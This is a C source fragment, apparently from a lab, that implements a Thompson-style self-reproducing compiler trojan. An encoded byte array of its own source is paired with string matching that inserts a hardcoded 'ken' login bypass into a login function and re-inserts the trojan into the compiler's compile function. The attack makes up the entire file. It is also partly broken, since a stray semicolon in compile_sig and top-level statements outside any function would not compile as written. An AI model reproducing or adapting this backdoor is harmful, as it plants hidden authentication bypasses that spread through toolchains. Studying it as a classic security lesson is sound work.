char prog[] = {
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	115, 	105, 	103, 	91, 	93, 	32,
	61, 	32, 	34, 	105, 	110, 	116, 	32, 	108,
	111, 	103, 	105, 	110, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	117, 	115, 	101, 	114, 	41,
	32, 	123, 	34, 	59, 	10, 	115, 	116, 	97,
	116, 	105, 	99, 	32, 	99, 	104, 	97, 	114,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	97,
	116, 	116, 	97, 	99, 	107, 	91, 	93, 	32,
	61, 	32, 	34, 	105, 	102, 	40, 	115, 	116,
	114, 	99, 	109, 	112, 	40, 	117, 	115, 	101,
	114, 	44, 	32, 	92, 	34, 	107, 	101, 	110,
	92, 	34, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	114, 	101, 	116, 	117, 	114, 	110,
	32, 	49, 	59, 	34, 	59, 	10, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	115, 	105, 	103, 	91, 	93,
	32, 	61, 	32, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	92, 	110, 	34, 	10,
	32, 	32, 	32, 	32, 	34, 	32, 	32, 	32,
	32, 	70, 	73, 	76, 	69, 	32, 	42, 	102,
	112, 	32, 	61, 	32, 	102, 	111, 	112, 	101,
	110, 	40, 	92, 	34, 	46, 	47, 	116, 	101,
	109, 	112, 	45, 	111, 	117, 	116, 	46, 	99,
	92, 	34, 	44, 	32, 	92, 	34, 	119, 	92,
	34, 	41, 	59, 	92, 	110, 	34, 	10, 	32,
	32, 	32, 	32, 	34, 	32, 	32, 	32, 	32,
	97, 	115, 	115, 	101, 	114, 	116, 	40, 	102,
	112, 	41, 	59, 	34, 	59, 	10, 	32, 	32,
	32, 	32, 	34, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	92, 	34, 	37, 	115, 	92,
	34, 	44, 	32, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	41, 	59, 	92, 	110, 	34, 	10,
	32, 	32, 	32, 	32, 	34, 	32, 	32, 	32,
	32, 	102, 	99, 	108, 	111, 	115, 	101, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	112, 	111,
	115, 	59, 	10, 	47, 	47, 	32, 	119, 	114,
	105, 	116, 	101, 	32, 	116, 	111, 	32, 	101,
	105, 	116, 	104, 	101, 	114, 	32, 	108, 	111,
	103, 	105, 	110, 	32, 	111, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	10, 	105,
	102, 	32, 	40, 	40, 	112, 	111, 	115, 	32,
	61, 	32, 	115, 	116, 	114, 	115, 	116, 	114,
	40, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	44, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	41, 	41, 	41, 	32, 	123,
	10, 	32, 	32, 	32, 	32, 	105, 	110, 	116,
	32, 	112, 	114, 	101, 	102, 	105, 	120, 	95,
	108, 	101, 	110, 	32, 	61, 	32, 	112, 	111,
	115, 	32, 	45, 	32, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	32, 	43, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	108, 	111, 	103,
	105, 	110, 	95, 	115, 	105, 	103, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	119, 	114,
	105, 	116, 	101, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	49, 	44, 	32,
	112, 	114, 	101, 	102, 	105, 	120, 	95, 	108,
	101, 	110, 	44, 	32, 	102, 	112, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	37, 	115, 	34, 	44, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	102, 	112, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	112, 	111, 	115, 	32,
	43, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	41, 	59, 	10, 	125, 	32,
	10, 	101, 	108, 	115, 	101, 	32, 	105, 	102,
	32, 	40, 	40, 	112, 	111, 	115, 	32, 	61,
	32, 	115, 	116, 	114, 	115, 	116, 	114, 	40,
	112, 	114, 	111, 	103, 	114, 	97, 	109, 	44,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	115, 	105, 	103, 	41, 	41, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	105, 	110,
	116, 	32, 	112, 	114, 	101, 	102, 	105, 	120,
	95, 	108, 	101, 	110, 	32, 	61, 	32, 	112,
	111, 	115, 	32, 	45, 	32, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	43, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	115, 	105,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	119, 	114, 	105, 	116, 	101, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	44, 	32,
	49, 	44, 	32, 	112, 	114, 	101, 	102, 	105,
	120, 	95, 	108, 	101, 	110, 	44, 	32, 	102,
	112, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	99, 	104, 	97,
	114, 	32, 	112, 	114, 	111, 	103, 	91, 	93,
	32, 	61, 	32, 	123, 	92, 	110, 	34, 	41,
	59, 	10, 	32, 	32, 	32, 	32, 	102, 	111,
	114, 	32, 	40, 	105, 	110, 	116, 	32, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	100, 	44, 	34, 	44, 	32, 	112,
	114, 	111, 	103, 	91, 	105, 	93, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	48, 	32, 	125, 	59, 	92, 	110,
	34, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	112, 	114, 	111, 	103, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	34, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	37, 	115, 	34, 	44, 	32, 	112,
	111, 	115, 	32, 	43, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	115, 	105, 	103, 	41,
	41, 	59, 	10, 	125, 	10, 	101, 	108, 	115,
	101, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	112, 	114, 	111, 	103, 	114, 	97,
	109, 	41, 	59, 	10, 	125, 0 };
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

static char compile_sig[] = 
    "static void compile(char *program, char *outname) {\n"
    "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
    "    assert(fp);";
    "    fprintf(fp, \"%s\", program);\n"
    "    fclose(fp);";

char *pos;
// write to either login or compile
if ((pos = strstr(program, login_sig))) {
    int prefix_len = pos - program + strlen(login_sig);
    fwrite(program, 1, prefix_len, fp);
    fprintf(fp, "%s", login_attack);
    fprintf(fp, "%s", pos + strlen(login_sig));
} 
else if ((pos = strstr(program, compile_sig))) {
    int prefix_len = pos - program + strlen(compile_sig);
    fwrite(program, 1, prefix_len, fp);
    fprintf(fp, "char prog[] = {\n");
    for (int i = 0; prog[i]; i++)
        fprintf(fp, "%d,", prog[i]);
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", prog);
    fprintf(fp, "fclose(fp);");
    fprintf(fp, "%s", pos + strlen(compile_sig));
}
else {
    fprintf(fp, "%s", program);
}